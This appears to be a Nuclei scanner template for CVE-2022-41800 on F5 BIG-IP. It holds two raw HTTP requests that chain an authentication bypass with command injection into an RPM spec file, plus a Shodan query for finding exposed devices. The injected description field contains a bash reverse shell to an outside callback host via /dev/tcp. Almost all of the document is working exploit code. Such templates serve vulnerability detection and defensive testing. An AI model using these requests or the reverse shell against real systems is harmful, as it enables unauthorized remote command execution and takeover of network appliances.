id: CVE-2022-41800
info:
  author: dwisiswant0
  description: 'When running in Appliance mode, an authenticated user assigned the
    Administrator role may

    be able to bypass Appliance mode restrictions, utilizing an undisclosed iControl
    REST endpoint.

    A successful exploit can allow the attacker to execute remote commands on server
    using

    authorization bypass (CVE-2022-1388)[5].

    '
  metadata:
    shodan-query: http.title:"BIG-IP&reg;-+Redirect" +"Server"
    verified: 'true'
  name: F5 BIG-IP iControl RPC - REST Appliance RCE
  reference:
  - https://attackerkb.com/topics/ZClTQn4aG4/cve-2022-41800/rapid7-analysis
  - https://support.f5.com/csp/article/K97843387
  - https://support.f5.com/csp/article/K13325942
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41800
  - https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/
  severity: critical
  tags: f5,bigip,cve,cve2022,rce
requests:
- extractors:
  - internal: true
    json:
    - .specFilePath
    name: spec
    part: body
    type: json
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: body
    type: word
    words:
    - RUN_BUILD_RPM_TASK
    - shared:iapp:build-package:buildrpmtaskstate
  matchers-condition: and
  raw:
  - "POST /mgmt/shared/iapp/rpm-spec-creator HTTP/1.1\nHost: {{Hostname}}\nX-F5-Auth-Token:\
    \ {{to_lower(rand_text_alpha(1))}}\nAuthorization: Basic {{base64(auth)}}\nContent-Type:\
    \ application/json\nConnection: keep-alive, X-F5-Auth-Token, X-Forwarded-Host\n\
    \n{\n  \"specFileData\": {\n    \"name\": \"{{rand_app}}\",\n    \"srcBasePath\"\
    : \"/tmp\",\n    \"version\": \"{{rand_ver}}\",\n    \"release\": \"{{rand_rel}}\"\
    ,\n    \"description\": \"\\n\\n%check\\nbash -i >& /dev/tcp/{{interactsh-url}}/{{rand_text_numeric(4)}}\
    \ 0>&1\",\n    \"summary\": \"{{to_lower(rand_text_alphanumeric(10))}}\"\n  }\n\
    }\n"
  - "POST /mgmt/shared/iapp/build-package HTTP/1.1\nHost: {{Hostname}}\nX-F5-Auth-Token:\
    \ {{to_lower(rand_text_alpha(1))}}\nAuthorization: Basic {{base64(auth)}}\nContent-Type:\
    \ application/json\nConnection: keep-alive, X-F5-Auth-Token, X-Forwarded-Host\n\
    \n{\n  \"state\": {},\n  \"appName\": \"{{rand_app}}\",\n  \"packageDirectory\"\
    : \"/tmp\",\n  \"specFilePath\": \"{{spec}}\",\n  \"force\": true\n}\n"
variables:
  auth: admin:{{rand_text_alpha(1)}}
  rand_app: '{{to_lower(rand_text_alpha(6))}}'
  rand_rel: '{{rand_text_numeric(1)}}.{{rand_text_numeric(1)}}.{{rand_text_numeric(1)}}'
  rand_ver: '{{rand_text_numeric(1)}}.{{rand_text_numeric(1)}}.{{rand_text_numeric(1)}}'
